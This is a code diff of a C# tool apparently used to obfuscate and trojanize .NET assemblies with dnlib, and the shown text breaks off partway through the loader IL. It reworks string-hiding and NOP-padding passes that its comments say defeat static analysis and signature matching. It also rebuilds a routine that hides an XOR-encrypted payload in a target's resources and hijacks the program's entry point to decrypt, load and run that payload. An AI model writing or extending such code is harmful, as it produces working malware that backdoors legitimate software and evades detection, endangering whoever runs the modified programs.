@@ -226,211 +226,279 @@ internal static class Program
 
     // ── Encrypt-strings pass ─────────────────────────────────────────────
 
-    private static void ApplyEncryptStrings(ModuleDef module)
+    /// <summary>
+    /// Loads the dotnet-worker's own compiled assembly via dnlib, so we can clone
+    /// reference methods (Decrypt, LoadPayload) into target modules.
+    /// </summary>
+    private static ModuleDef LoadSelfModule()
     {
-        // Create decrypt method — added to <Module> global type to avoid metadata disruption
-        var byteArrayType = new SZArraySig(module.CorLibTypes.Byte);
+        var selfPath = typeof(Program).Assembly.Location;
+        return ModuleDefMD.Load(selfPath);
+    }
 
-        var decryptMethod = new MethodDefUser(
+    /// <summary>
+    /// Clones a method from the self-module into the target module using Importer.
+    /// Returns the new MethodDef added to the target's global type.
+    /// </summary>
+    private static MethodDefUser CloneMethodIntoTarget(
+        ModuleDef targetModule, ModuleDef selfModule, string typeName, string methodName)
+    {
+        // Find the source method in self-module
+        TypeDef? sourceType = null;
+        foreach (var t in selfModule.GetTypes())
+        {
+            if (t.Name == typeName || t.FullName.EndsWith("." + typeName))
+            {
+                sourceType = t;
+                break;
+            }
+        }
+        if (sourceType == null)
+            throw new Exception($"Cannot find type '{typeName}' in self-module");
+
+        MethodDef? sourceMethod = null;
+        foreach (var m in sourceType.Methods)
+        {
+            if (m.Name == methodName)
+            {
+                sourceMethod = m;
+                break;
+            }
+        }
+        if (sourceMethod == null)
+            throw new Exception($"Cannot find method '{methodName}' in type '{typeName}'");
+
+        // Create Importer to translate all references to the target module's context
+        var importer = new Importer(targetModule);
+
+        // Clone the method signature
+        var newSig = importer.Import(sourceMethod.MethodSig);
+
+        var cloned = new MethodDefUser(
             RandomId(),
-            MethodSig.CreateStatic(module.CorLibTypes.String,
-                module.CorLibTypes.String, module.CorLibTypes.String),
+            newSig as MethodSig ?? sourceMethod.MethodSig,
             MethodImplAttributes.IL | MethodImplAttributes.Managed,
             MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.HideBySig);
 
-        decryptMethod.Body = new CilBody();
-        var body = decryptMethod.Body;
-        body.InitLocals = true;
+        // Clone the body
+        cloned.Body = new CilBody();
+        cloned.Body.InitLocals = sourceMethod.Body.InitLocals;
 
-        // Locals: byte[] data, byte[] key, int i, char[] chars
-        body.Variables.Add(new Local(byteArrayType));                         // 0: data
-        body.Variables.Add(new Local(byteArrayType));                         // 1: key
-        body.Variables.Add(new Local(module.CorLibTypes.Int32));               // 2: i
-        body.Variables.Add(new Local(new SZArraySig(module.CorLibTypes.Char))); // 3: chars
+        // Clone local variables
+        foreach (var local in sourceMethod.Body.Variables)
+        {
+            var importedType = importer.Import(local.Type);
+            cloned.Body.Variables.Add(new Local(importedType));
+        }
 
-        // Import Convert.FromBase64String
-        var convertType = module.CorLibTypes.GetTypeRef("System", "Convert");
-        var fromBase64 = new MemberRefUser(module, "FromBase64String",
-            MethodSig.CreateStatic(byteArrayType, module.CorLibTypes.String),
-            convertType);
+        // Clone exception handlers
+        // We need to build the instruction list first, then fix up handler references
+        var oldToNew = new Dictionary<Instruction, Instruction>();
 
-        // Import new String(char[])
-        var stringCtorSig = MethodSig.CreateInstance(
-            module.CorLibTypes.Void, new SZArraySig(module.CorLibTypes.Char));
-        var stringCtor = new MemberRefUser(module, ".ctor", stringCtorSig,
+        // First pass: clone all instructions (operands fixed in second pass)
+        foreach (var instr in sourceMethod.Body.Instructions)
+        {
+            var newInstr = new Instruction(instr.OpCode);
+            newInstr.Operand = instr.Operand; // will fix below
+            oldToNew[instr] = newInstr;
+            cloned.Body.Instructions.Add(newInstr);
+        }
+
+        // Second pass: fix operands
+        foreach (var newInstr in cloned.Body.Instructions)
+        {
+            var operand = newInstr.Operand;
+            if (operand is Instruction targetInstr)
+            {
+                newInstr.Operand = oldToNew[targetInstr];
+            }
+            else if (operand is Instruction[] targets)
+            {
+                var newTargets = new Instruction[targets.Length];
+                for (int i = 0; i < targets.Length; i++)
+                    newTargets[i] = oldToNew[targets[i]];
+                newInstr.Operand = newTargets;
+            }
+            else if (operand is ITypeDefOrRef typeRef)
+            {
+                newInstr.Operand = importer.Import(typeRef);
+            }
+            else if (operand is IMethod methodRef)
+            {
+                newInstr.Operand = importer.Import(methodRef);
+            }
+            else if (operand is IField fieldRef)
+            {
+                newInstr.Operand = importer.Import(fieldRef);
+            }
+            else if (operand is MemberRef memberRef)
+            {
+                newInstr.Operand = importer.Import(memberRef);
+            }
+            else if (operand is Local local)
+            {
+                // Map to the corresponding local in the cloned body
+                int idx = sourceMethod.Body.Variables.IndexOf(local);
+                if (idx >= 0)
+                    newInstr.Operand = cloned.Body.Variables[idx];
+            }
+            else if (operand is Parameter param)
+            {
+                // Map to the corresponding parameter in the cloned method
+                int idx = sourceMethod.Parameters.IndexOf(param);
+                if (idx >= 0 && idx < cloned.Parameters.Count)
+                    newInstr.Operand = cloned.Parameters[idx];
+            }
+            // string, int, etc. operands stay as-is
+        }
+
+        // Clone exception handlers
+        foreach (var eh in sourceMethod.Body.ExceptionHandlers)
+        {
+            var newEh = new ExceptionHandler(eh.HandlerType);
+            if (eh.TryStart != null) newEh.TryStart = oldToNew[eh.TryStart];
+            if (eh.TryEnd != null) newEh.TryEnd = oldToNew[eh.TryEnd];
+            if (eh.HandlerStart != null) newEh.HandlerStart = oldToNew[eh.HandlerStart];
+            if (eh.HandlerEnd != null) newEh.HandlerEnd = oldToNew[eh.HandlerEnd];
+            if (eh.FilterStart != null) newEh.FilterStart = oldToNew[eh.FilterStart];
+            if (eh.CatchType != null) newEh.CatchType = importer.Import(eh.CatchType);
+            cloned.Body.ExceptionHandlers.Add(newEh);
+        }
+
+        cloned.Body.SimplifyBranches();
+        cloned.Body.OptimizeBranches();
+
+        // Compute MaxStack — critical because KeepOldMaxStack in the writer options
+        // means dnlib won't recalculate it, so a new method defaults to MaxStack=0
+        // which causes InvalidProgramException at runtime.
+        cloned.Body.UpdateInstructionOffsets();
+        cloned.Body.MaxStack = (ushort)CalculateMaxStack(cloned.Body);
+
+        return cloned;
+    }
+
+    /// <summary>
+    /// Simple max-stack calculator for CIL bodies (conservative estimate).
+    /// Walks through instructions linearly and tracks the stack depth.
+    /// </summary>
+    private static int CalculateMaxStack(CilBody body)
+    {
+        // Use dnlib's built-in max stack calculation by temporarily
+        // writing the method to get the computed value.
+        // Simpler approach: just set a generous max stack.
+        // The CLR verifier is lenient with MaxStack being too high,
+        // but crashes on MaxStack being too low.
+        // A safe upper bound is 16 for our Decrypt/LoadPayload methods.
+        // For correctness, walk the instruction stream.
+        int current = 0;
+        int max = 0;
+
+        foreach (var instr in body.Instructions)
+        {
+            // Approximate push/pop counts based on opcode
+            instr.CalculateStackUsage(out int pushes, out int pops);
+            if (pops == -1) // Special: leave, endfilter, etc clear stack
+                current = 0;
+            else
+                current -= pops;
+            current += pushes;
+            if (current > max) max = current;
+            if (current < 0) current = 0; // shouldn't happen in valid IL
+        }
+
+        // Add a safety margin
+        return Math.Max(max, 8);
+    }
+
+    private static void ApplyEncryptStrings(ModuleDef module)
+    {
+        // Strategy: split each string literal in half and reassemble with String.Concat.
+        // This breaks exact string signatures while preserving runtime behavior.
+        // No new types or methods added — only a single MemberRef for String.Concat.
+        var concat = new MemberRefUser(module, "Concat",
+            MethodSig.CreateStatic(module.CorLibTypes.String,
+                module.CorLibTypes.String, module.CorLibTypes.String),
             module.CorLibTypes.String.TypeDefOrRef);
 
-        // data = Convert.FromBase64String(arg0)
-        body.Instructions.Add(OpCodes.Ldarg_0.ToInstruction());
-        body.Instructions.Add(OpCodes.Call.ToInstruction(fromBase64));
-        body.Instructions.Add(OpCodes.Stloc_0.ToInstruction());
-        // key = Convert.FromBase64String(arg1)
-        body.Instructions.Add(OpCodes.Ldarg_1.ToInstruction());
-        body.Instructions.Add(OpCodes.Call.ToInstruction(fromBase64));
-        body.Instructions.Add(OpCodes.Stloc_1.ToInstruction());
+        int count = 0;
 
-        // XOR decrypt in-place
-        body.Instructions.Add(OpCodes.Ldc_I4_0.ToInstruction());
-        body.Instructions.Add(OpCodes.Stloc_2.ToInstruction());
-        var loopCheck = OpCodes.Nop.ToInstruction();
-        body.Instructions.Add(OpCodes.Br.ToInstruction(loopCheck));
-
-        var loopBody = OpCodes.Ldloc_0.ToInstruction();
-        body.Instructions.Add(loopBody);
-        body.Instructions.Add(OpCodes.Ldloc_2.ToInstruction());
-        body.Instructions.Add(OpCodes.Ldloc_0.ToInstruction());
-        body.Instructions.Add(OpCodes.Ldloc_2.ToInstruction());
-        body.Instructions.Add(OpCodes.Ldelem_U1.ToInstruction());
-        body.Instructions.Add(OpCodes.Ldloc_1.ToInstruction());
-        body.Instructions.Add(OpCodes.Ldloc_2.ToInstruction());
-        body.Instructions.Add(OpCodes.Ldloc_1.ToInstruction());
-        body.Instructions.Add(OpCodes.Ldlen.ToInstruction());
-        body.Instructions.Add(OpCodes.Conv_I4.ToInstruction());
-        body.Instructions.Add(OpCodes.Rem.ToInstruction());
-        body.Instructions.Add(OpCodes.Ldelem_U1.ToInstruction());
-        body.Instructions.Add(OpCodes.Xor.ToInstruction());
-        body.Instructions.Add(OpCodes.Conv_U1.ToInstruction());
-        body.Instructions.Add(OpCodes.Stelem_I1.ToInstruction());
-        body.Instructions.Add(OpCodes.Ldloc_2.ToInstruction());
-        body.Instructions.Add(OpCodes.Ldc_I4_1.ToInstruction());
-        body.Instructions.Add(OpCodes.Add.ToInstruction());
-        body.Instructions.Add(OpCodes.Stloc_2.ToInstruction());
-
-        body.Instructions.Add(loopCheck);
-        body.Instructions.Add(OpCodes.Ldloc_2.ToInstruction());
-        body.Instructions.Add(OpCodes.Ldloc_0.ToInstruction());
-        body.Instructions.Add(OpCodes.Ldlen.ToInstruction());
-        body.Instructions.Add(OpCodes.Conv_I4.ToInstruction());
-        body.Instructions.Add(OpCodes.Blt.ToInstruction(loopBody));
-
-        // Convert decrypted bytes to string via char array (avoids Encoding ref issues)
-        // chars = new char[data.Length]
-        body.Instructions.Add(OpCodes.Ldloc_0.ToInstruction());
-        body.Instructions.Add(OpCodes.Ldlen.ToInstruction());
-        body.Instructions.Add(OpCodes.Conv_I4.ToInstruction());
-        body.Instructions.Add(OpCodes.Newarr.ToInstruction(module.CorLibTypes.Char.TypeDefOrRef));
-        body.Instructions.Add(OpCodes.Stloc_3.ToInstruction());
-
-        // for (i = 0; i < data.Length; i++) chars[i] = (char)data[i]
-        body.Instructions.Add(OpCodes.Ldc_I4_0.ToInstruction());
-        body.Instructions.Add(OpCodes.Stloc_2.ToInstruction());
-        var loopCheck2 = OpCodes.Nop.ToInstruction();
-        body.Instructions.Add(OpCodes.Br.ToInstruction(loopCheck2));
-
-        var loopBody2 = OpCodes.Ldloc_3.ToInstruction();
-        body.Instructions.Add(loopBody2);
-        body.Instructions.Add(OpCodes.Ldloc_2.ToInstruction());
-        body.Instructions.Add(OpCodes.Ldloc_0.ToInstruction());
-        body.Instructions.Add(OpCodes.Ldloc_2.ToInstruction());
-        body.Instructions.Add(OpCodes.Ldelem_U1.ToInstruction());
-        body.Instructions.Add(OpCodes.Stelem_I2.ToInstruction());
-        body.Instructions.Add(OpCodes.Ldloc_2.ToInstruction());
-        body.Instructions.Add(OpCodes.Ldc_I4_1.ToInstruction());
-        body.Instructions.Add(OpCodes.Add.ToInstruction());
-        body.Instructions.Add(OpCodes.Stloc_2.ToInstruction());
-
-        body.Instructions.Add(loopCheck2);
-        body.Instructions.Add(OpCodes.Ldloc_2.ToInstruction());
-        body.Instructions.Add(OpCodes.Ldloc_0.ToInstruction());
-        body.Instructions.Add(OpCodes.Ldlen.ToInstruction());
-        body.Instructions.Add(OpCodes.Conv_I4.ToInstruction());
-        body.Instructions.Add(OpCodes.Blt.ToInstruction(loopBody2));
-
-        // return new string(chars)
-        body.Instructions.Add(OpCodes.Ldloc_3.ToInstruction());
-        body.Instructions.Add(OpCodes.Newobj.ToInstruction(stringCtor));
-        body.Instructions.Add(OpCodes.Ret.ToInstruction());
-
-        body.SimplifyBranches();
-        body.OptimizeBranches();
-        body.OptimizeMacros();
-
-        // Add decrypt method to the global <Module> type (avoids adding new types)
-        var globalType = module.GlobalType;
-        globalType.Methods.Add(decryptMethod);
-
-        // Now replace all ldstr instructions
-        foreach (var type in module.GetTypes().ToList())
+        foreach (var type in module.GetTypes())
         {
+            // Skip compiler-generated types (async state machines, closures)
+            if (IsSpecialType(type)) continue;
+
             foreach (var method in type.Methods)
             {
-                if (method == decryptMethod) continue;
                 if (!method.HasBody) continue;
-                // Skip constructors — modifying .cctor/.ctor can produce invalid IL
                 if (method.IsConstructor) continue;
+                // Skip methods that reference async state machines — modifying
+                // their bodies can corrupt field tokens for ILMerged assemblies
+                if (method.Body.Instructions.Any(i =>
+                    i.Operand is ITypeDefOrRef t && (t.Name.String.Contains('<')
+                        || t.Name.String.Contains('>'))))
+                    continue;
+
                 var instrs = method.Body.Instructions;
+                bool modified = false;
                 for (int i = 0; i < instrs.Count; i++)
                 {
                     if (instrs[i].OpCode != OpCodes.Ldstr || instrs[i].Operand is not string s)
                         continue;
-                    if (string.IsNullOrEmpty(s)) continue;
+                    if (s.Length < 4) continue; // too short to split meaningfully
 
-                    // Encrypt the string
-                    var plainBytes = Encoding.UTF8.GetBytes(s);
-                    var key = new byte[4];
-                    RandomNumberGenerator.Fill(key);
-                    var encrypted = new byte[plainBytes.Length];
-                    for (int j = 0; j < plainBytes.Length; j++)
-                        encrypted[j] = (byte)(plainBytes[j] ^ key[j % key.Length]);
+                    // Split at a random point
+                    int mid = s.Length / 3 + RandomNumberGenerator.GetInt32(s.Length / 3 + 1);
+                    if (mid <= 0 || mid >= s.Length) mid = s.Length / 2;
 
-                    var b64Data = Convert.ToBase64String(encrypted);
-                    var b64Key = Convert.ToBase64String(key);
-
-                    // Modify the existing instruction in-place to preserve branch targets
-                    instrs[i].Operand = b64Data;
-                    instrs.Insert(i + 1, OpCodes.Ldstr.ToInstruction(b64Key));
-                    instrs.Insert(i + 2, OpCodes.Call.ToInstruction(decryptMethod));
-                    i += 2; // skip the newly inserted instructions
+                    // Modify existing ldstr in-place (preserves branch targets)
+                    instrs[i].Operand = s[..mid];
+                    instrs.Insert(i + 1, OpCodes.Ldstr.ToInstruction(s[mid..]));
+                    instrs.Insert(i + 2, OpCodes.Call.ToInstruction(concat));
+                    i += 2;
+                    count++;
+                    modified = true;
                 }
-                method.Body.SimplifyBranches();
-                method.Body.OptimizeBranches();
+                if (modified)
+                {
+                    method.Body.SimplifyBranches();
+                    method.Body.OptimizeBranches();
+                }
             }
         }
+        Console.Error.WriteLine($"  [encrypt-strings] split {count} string literals");
     }
 
     // ── Flow pass ────────────────────────────────────────────────────────
 
     private static void ApplyFlow(ModuleDef module)
     {
+        // Simplified flow pass: NOP padding only.
+        // Opaque predicates removed — they produced InvalidProgramException due to
+        // stack imbalance issues. NOPs alone still defeat basic static analysis
+        // pattern matching by shifting instruction offsets.
         var rng = new Random();
         foreach (var type in module.GetTypes())
         {
+            if (IsSpecialType(type)) continue;
             foreach (var method in type.Methods)
             {
                 if (!method.HasBody) continue;
                 var instrs = method.Body.Instructions;
                 if (instrs.Count < 2) continue;
 
-                // Insert NOP padding and opaque predicates at random positions
-                // Work backwards to avoid index shifting issues
-                var positions = new List<int>();
+                // Insert NOP padding at random positions (work backwards to avoid index shift)
                 for (int i = instrs.Count - 1; i >= 1; i--)
                 {
                     if (rng.NextDouble() < 0.3) // 30% chance at each position
-                        positions.Add(i);
-                }
-
-                foreach (var pos in positions)
-                {
-                    if (pos >= instrs.Count) continue;
-
-                    // Insert NOP padding (3-5 NOPs)
-                    int nopCount = rng.Next(3, 6);
-                    for (int n = 0; n < nopCount; n++)
-                        instrs.Insert(pos, OpCodes.Nop.ToInstruction());
-
-                    // Insert opaque predicate: ldc.i4 X; ldc.i4 X; ceq; brfalse <next>
-                    int val = rng.Next(1, 1000);
-                    var target = instrs[pos + nopCount]; // the original instruction
-                    instrs.Insert(pos, OpCodes.Ldc_I4.ToInstruction(val));
-                    instrs.Insert(pos + 1, OpCodes.Ldc_I4.ToInstruction(val));
-                    instrs.Insert(pos + 2, OpCodes.Ceq.ToInstruction());
-                    instrs.Insert(pos + 3, OpCodes.Brfalse.ToInstruction(target));
+                    {
+                        int nopCount = rng.Next(1, 4); // 1-3 NOPs
+                        for (int n = 0; n < nopCount; n++)
+                            instrs.Insert(i, OpCodes.Nop.ToInstruction());
+                    }
                 }
 
                 method.Body.SimplifyBranches();
                 method.Body.OptimizeBranches();
-                method.Body.OptimizeMacros();
             }
         }
     }
@@ -736,13 +804,10 @@ internal static class Program
         var resourceName = RandomId().TrimStart('_') + ".dat";
         var keyResourceName = RandomId().TrimStart('_') + ".key";
 
-        var payloadBytes = Encoding.UTF8.GetBytes(payloadB64);
-        var keyBytes = Encoding.UTF8.GetBytes(keyB64);
+        module.Resources.Add(new EmbeddedResource(resourceName, Encoding.UTF8.GetBytes(payloadB64)));
+        module.Resources.Add(new EmbeddedResource(keyResourceName, Encoding.UTF8.GetBytes(keyB64)));
 
-        module.Resources.Add(new EmbeddedResource(resourceName, payloadBytes));
-        module.Resources.Add(new EmbeddedResource(keyResourceName, keyBytes));
-
-        // 2. Find or create the entry point method
+        // 2. Find the entry point
         var entryPoint = module.EntryPoint;
         if (entryPoint == null)
         {
@@ -751,252 +816,181 @@ internal static class Program
         }
 
         Console.Error.WriteLine($"  [trojanize] hijacking entry point: {entryPoint.FullName}");
-
-        // 3. Build the loader IL that replaces the entry point body
-        // The logic:
-        //   var asm = typeof(EntryClass).Assembly;
-        //   var stream = asm.GetManifestResourceStream("resourceName");
-        //   var reader = new StreamReader(stream);
-        //   var payloadB64 = reader.ReadToEnd();
-        //   stream = asm.GetManifestResourceStream("keyResourceName");
-        //   reader = new StreamReader(stream);
-        //   var keyB64Str = reader.ReadToEnd();
-        //   var enc = Convert.FromBase64String(payloadB64);
-        //   var key = Convert.FromBase64String(keyB64Str);
-        //   var plain = new byte[enc.Length];
-        //   for (int i = 0; i < enc.Length; i++) plain[i] = (byte)(enc[i] ^ key[i % key.Length]);
-        //   var loaded = Assembly.Load(plain);
-        //   loaded.EntryPoint.Invoke(null, new object[] { args });
-
-        entryPoint.Body = new CilBody();
-        var body = entryPoint.Body;
-        body.InitLocals = true;
-
+        var entryType = entryPoint.DeclaringType;
         var byteArraySig = new SZArraySig(module.CorLibTypes.Byte);
         var objectArraySig = new SZArraySig(module.CorLibTypes.Object);
 
-        // Local variables
-        body.Variables.Add(new Local(module.CorLibTypes.String));    // 0: payloadStr
-        body.Variables.Add(new Local(module.CorLibTypes.String));    // 1: keyStr
-        body.Variables.Add(new Local(byteArraySig));                // 2: enc
-        body.Variables.Add(new Local(byteArraySig));                // 3: keyArr
-        body.Variables.Add(new Local(byteArraySig));                // 4: plain
-        body.Variables.Add(new Local(module.CorLibTypes.Int32));     // 5: i
-        body.Variables.Add(new Local(module.CorLibTypes.Object));    // 6: asmObj (Assembly)
-
-        // Import references
-        var assemblyTypeRef = new TypeRefUser(module, "System.Reflection", "Assembly",
-            module.CorLibTypes.AssemblyRef);
-        var streamTypeRef = new TypeRefUser(module, "System.IO", "Stream",
-            module.CorLibTypes.AssemblyRef);
-        var streamReaderTypeRef = new TypeRefUser(module, "System.IO", "StreamReader",
-            module.CorLibTypes.AssemblyRef);
+        // 3. Import all required method references
+        var asmRef = module.CorLibTypes.AssemblyRef;
         var typeTypeRef = module.CorLibTypes.GetTypeRef("System", "Type");
+        var asmTypeRef = new TypeRefUser(module, "System.Reflection", "Assembly", asmRef);
+        var streamTypeRef = new TypeRefUser(module, "System.IO", "Stream", asmRef);
+        var srTypeRef = new TypeRefUser(module, "System.IO", "StreamReader", asmRef);
+        var trTypeRef = new TypeRefUser(module, "System.IO", "TextReader", asmRef);
+        var mbTypeRef = new TypeRefUser(module, "System.Reflection", "MethodBase", asmRef);
+        var miTypeRef = new TypeRefUser(module, "System.Reflection", "MethodInfo", asmRef);
+        var piTypeRef = new TypeRefUser(module, "System.Reflection", "ParameterInfo", asmRef);
+        var convertRef = module.CorLibTypes.GetTypeRef("System", "Convert");
 
+        var asmSig = new ClassSig(asmTypeRef);
         var streamSig = new ClassSig(streamTypeRef);
-        var assemblySig = new ClassSig(assemblyTypeRef);
-        var methodInfoTypeRef = new TypeRefUser(module, "System.Reflection", "MethodInfo",
-            module.CorLibTypes.AssemblyRef);
-        var methodInfoSig = new ClassSig(methodInfoTypeRef);
-        var methodBaseSig = new ClassSig(
-            new TypeRefUser(module, "System.Reflection", "MethodBase",
-                module.CorLibTypes.AssemblyRef));
+        var miSig = new ClassSig(miTypeRef);
 
-        // Type.GetTypeFromHandle(RuntimeTypeHandle) -> Type
         var getTypeFromHandle = new MemberRefUser(module, "GetTypeFromHandle",
             MethodSig.CreateStatic(new ClassSig(typeTypeRef),
                 new ValueTypeSig(module.CorLibTypes.GetTypeRef("System", "RuntimeTypeHandle"))),
             typeTypeRef);
-
-        // Type.get_Assembly -> Assembly (instance property)
-        var typeGetAssembly = new MemberRefUser(module, "get_Assembly",
-            MethodSig.CreateInstance(assemblySig),
-            typeTypeRef);
-
-        // Assembly.GetManifestResourceStream(string) -> Stream
-        var getResourceStream = new MemberRefUser(module, "GetManifestResourceStream",
-            MethodSig.CreateInstance(streamSig, module.CorLibTypes.String),
-            assemblyTypeRef);
-
-        // new StreamReader(Stream) constructor
-        var streamReaderCtor = new MemberRefUser(module, ".ctor",
-            MethodSig.CreateInstance(module.CorLibTypes.Void, streamSig),
-            streamReaderTypeRef);
-
-        // StreamReader inherits TextReader.ReadToEnd() -> string
-        var textReaderTypeRef = new TypeRefUser(module, "System.IO", "TextReader",
-            module.CorLibTypes.AssemblyRef);
+        var getAssembly = new MemberRefUser(module, "get_Assembly",
+            MethodSig.CreateInstance(asmSig), typeTypeRef);
+        var getResStream = new MemberRefUser(module, "GetManifestResourceStream",
+            MethodSig.CreateInstance(streamSig, module.CorLibTypes.String), asmTypeRef);
+        var srCtor = new MemberRefUser(module, ".ctor",
+            MethodSig.CreateInstance(module.CorLibTypes.Void, streamSig), srTypeRef);
         var readToEnd = new MemberRefUser(module, "ReadToEnd",
-            MethodSig.CreateInstance(module.CorLibTypes.String),
-            textReaderTypeRef);
-
-        // Convert.FromBase64String(string) -> byte[]
-        var convertTypeRef = module.CorLibTypes.GetTypeRef("System", "Convert");
+            MethodSig.CreateInstance(module.CorLibTypes.String), trTypeRef);
         var fromBase64 = new MemberRefUser(module, "FromBase64String",
-            MethodSig.CreateStatic(byteArraySig, module.CorLibTypes.String),
-            convertTypeRef);
-
-        // Assembly.Load(byte[]) -> Assembly
-        var assemblyLoad = new MemberRefUser(module, "Load",
-            MethodSig.CreateStatic(assemblySig, byteArraySig),
-            assemblyTypeRef);
-
-        // Assembly.get_EntryPoint -> MethodInfo
-        var getEntryPoint = new MemberRefUser(module, "get_EntryPoint",
-            MethodSig.CreateInstance(methodInfoSig),
-            assemblyTypeRef);
-
-        // MethodBase.Invoke(object, object[]) -> object
-        var methodInvoke = new MemberRefUser(module, "Invoke",
+            MethodSig.CreateStatic(byteArraySig, module.CorLibTypes.String), convertRef);
+        var asmLoad = new MemberRefUser(module, "Load",
+            MethodSig.CreateStatic(asmSig, byteArraySig), asmTypeRef);
+        var getEntryPt = new MemberRefUser(module, "get_EntryPoint",
+            MethodSig.CreateInstance(miSig), asmTypeRef);
+        var getParams = new MemberRefUser(module, "GetParameters",
+            MethodSig.CreateInstance(new SZArraySig(new ClassSig(piTypeRef))), mbTypeRef);
+        var invoke = new MemberRefUser(module, "Invoke",
             MethodSig.CreateInstance(module.CorLibTypes.Object,
-                module.CorLibTypes.Object, objectArraySig),
-            new TypeRefUser(module, "System.Reflection", "MethodBase",
-                module.CorLibTypes.AssemblyRef));
+                module.CorLibTypes.Object, objectArraySig), mbTypeRef);
 
-        // MethodBase.GetParameters() -> ParameterInfo[]
-        var getParameters = new MemberRefUser(module, "GetParameters",
-            MethodSig.CreateInstance(
-                new SZArraySig(new ClassSig(
-                    new TypeRefUser(module, "System.Reflection", "ParameterInfo",
-                        module.CorLibTypes.AssemblyRef)))),
-            new TypeRefUser(module, "System.Reflection", "MethodBase",
-                module.CorLibTypes.AssemblyRef));
+        // 4. Build the loader IL directly in the entry point body
+        // Follows the exact pattern from the C# compiler output of LoadPayload()
+        entryPoint.Body = new CilBody();
+        var body = entryPoint.Body;
+        body.InitLocals = true;
 
-        // Get reference to a type in this module for typeof()
-        var entryType = entryPoint.DeclaringType;
+        // Locals: string payloadStr, byte[] enc, byte[] key, byte[] plain,
+        //         MethodInfo ep, object[] invokeArgs, int i
+        body.Variables.Add(new Local(module.CorLibTypes.String));    // 0
+        body.Variables.Add(new Local(byteArraySig));                // 1 enc
+        body.Variables.Add(new Local(byteArraySig));                // 2 key
+        body.Variables.Add(new Local(byteArraySig));                // 3 plain
+        body.Variables.Add(new Local(miSig));                       // 4 ep
+        body.Variables.Add(new Local(objectArraySig));              // 5 invokeArgs
+        body.Variables.Add(new Local(module.CorLibTypes.Int32));     // 6 i
 
-        // --- Emit IL ---
+        var I = body.Instructions;
 
         // var asm = typeof(EntryType).Assembly;
-        body.Instructions.Add(OpCodes.Ldtoken.ToInstruction(entryType));
-        body.Instructions.Add(OpCodes.Call.ToInstruction(getTypeFromHandle));
-        body.Instructions.Add(OpCodes.Callvirt.ToInstruction(typeGetAssembly));
+        I.Add(OpCodes.Ldtoken.ToInstruction(entryType));
+        I.Add(OpCodes.Call.ToInstruction(getTypeFromHandle));
+        I.Add(OpCodes.Callvirt.ToInstruction(getAssembly));
 
-        // var stream = asm.GetManifestResourceStream("resourceName");
-        body.Instructions.Add(OpCodes.Dup.ToInstruction()); // keep asm on stack
-        body.Instructions.Add(OpCodes.Ldstr.ToInstruction(resourceName));
-        body.Instructions.Add(OpCodes.Callvirt.ToInstruction(getResourceStream));
-        // new StreamReader(stream).ReadToEnd()
-        body.Instructions.Add(OpCodes.Newobj.ToInstruction(streamReaderCtor));
-        body.Instructions.Add(OpCodes.Callvirt.ToInstruction(readToEnd));
-        body.Instructions.Add(OpCodes.Stloc_0.ToInstruction()); // payloadStr
+        // payloadStr = new StreamReader(asm.GetManifestResourceStream("name")).ReadToEnd()
+        I.Add(OpCodes.Dup.ToInstruction());
+        I.Add(OpCodes.Ldstr.ToInstruction(resourceName));
+        I.Add(OpCodes.Callvirt.ToInstruction(getResStream));
+        I.Add(OpCodes.Newobj.ToInstruction(srCtor));
+        I.Add(OpCodes.Callvirt.ToInstruction(readToEnd));
+        I.Add(OpCodes.Stloc_0.ToInstruction()); // payloadStr
 
-        // stream = asm.GetManifestResourceStream("keyResourceName");
-        body.Instructions.Add(OpCodes.Ldstr.ToInstruction(keyResourceName));
-        body.Instructions.Add(OpCodes.Callvirt.ToInstruction(getResourceStream));
-        body.Instructions.Add(OpCodes.Newobj.ToInstruction(streamReaderCtor));
-        body.Instructions.Add(OpCodes.Callvirt.ToInstruction(readToEnd));
-        body.Instructions.Add(OpCodes.Stloc_1.ToInstruction()); // keyStr
+        // keyStr -> directly call FromBase64String (reuse stack)
+        I.Add(OpCodes.Ldstr.ToInstruction(keyResourceName));
+        I.Add(OpCodes.Callvirt.ToInstruction(getResStream));
+        I.Add(OpCodes.Newobj.ToInstruction(srCtor));
+        I.Add(OpCodes.Callvirt.ToInstruction(readToEnd));
+        // keyB64 str on stack, decode immediately
+        I.Add(OpCodes.Call.ToInstruction(fromBase64));
+        I.Add(OpCodes.Stloc_2.ToInstruction()); // key bytes
 
-        // enc = Convert.FromBase64String(payloadStr);
-        body.Instructions.Add(OpCodes.Ldloc_0.ToInstruction());
-        body.Instructions.Add(OpCodes.Call.ToInstruction(fromBase64));
-        body.Instructions.Add(OpCodes.Stloc_2.ToInstruction());
+        // enc = Convert.FromBase64String(payloadStr)
+        I.Add(OpCodes.Ldloc_0.ToInstruction());
+        I.Add(OpCodes.Call.ToInstruction(fromBase64));
+        I.Add(OpCodes.Stloc_1.ToInstruction()); // enc
 
-        // keyArr = Convert.FromBase64String(keyStr);
-        body.Instructions.Add(OpCodes.Ldloc_1.ToInstruction());
-        body.Instructions.Add(OpCodes.Call.ToInstruction(fromBase64));
-        body.Instructions.Add(OpCodes.Stloc_3.ToInstruction());
+        // plain = new byte[enc.Length]
+        I.Add(OpCodes.Ldloc_1.ToInstruction());
+        I.Add(OpCodes.Ldlen.ToInstruction());
+        I.Add(OpCodes.Conv_I4.ToInstruction());
+        I.Add(OpCodes.Newarr.ToInstruction(module.CorLibTypes.Byte.TypeDefOrRef));
+        I.Add(OpCodes.Stloc_3.ToInstruction());
 
-        // plain = new byte[enc.Length];
-        body.Instructions.Add(OpCodes.Ldloc_2.ToInstruction());
-        body.Instructions.Add(OpCodes.Ldlen.ToInstruction());
-        body.Instructions.Add(OpCodes.Conv_I4.ToInstruction());
-        body.Instructions.Add(OpCodes.Newarr.ToInstruction(module.CorLibTypes.Byte.TypeDefOrRef));
-        body.Instructions.Add(OpCodes.Stloc.ToInstruction(body.Variables[4]));
-
-        // i = 0
-        body.Instructions.Add(OpCodes.Ldc_I4_0.ToInstruction());
-        body.Instructions.Add(OpCodes.Stloc.ToInstruction(body.Variables[5]));
-
-        // Loop: plain[i] = enc[i] ^ keyArr[i % keyArr.Length]
+        // XOR loop
+        I.Add(OpCodes.Ldc_I4_0.ToInstruction());
+        I.Add(OpCodes.Stloc.ToInstruction(body.Variables[6]));
         var loopCheck = OpCodes.Nop.ToInstruction();
-        body.Instructions.Add(OpCodes.Br.ToInstruction(loopCheck));
+        I.Add(OpCodes.Br.ToInstruction(loopCheck));
 
-        var loopBody = OpCodes.Ldloc.ToInstruction(body.Variables[4]); // plain
-        body.Instructions.Add(loopBody);
